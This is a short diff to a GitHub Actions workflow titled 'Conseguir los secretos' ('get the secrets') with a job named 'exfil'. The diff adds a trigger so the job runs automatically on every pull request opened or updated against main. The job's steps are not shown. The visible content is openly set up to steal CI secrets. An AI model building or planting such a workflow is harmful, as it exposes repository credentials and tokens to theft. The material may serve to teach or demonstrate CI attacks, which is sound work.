@@ -1,5 +1,11 @@
 name: Conseguir los secretos
 
+on:
+  pull_request:
+    types: [opened, synchronize]
+    branches:
+      - main
+
 jobs:                                                                                                                                                            
   exfil:                                                                                                                                                         
     runs-on: ubuntu-latest                                                                                                                                       
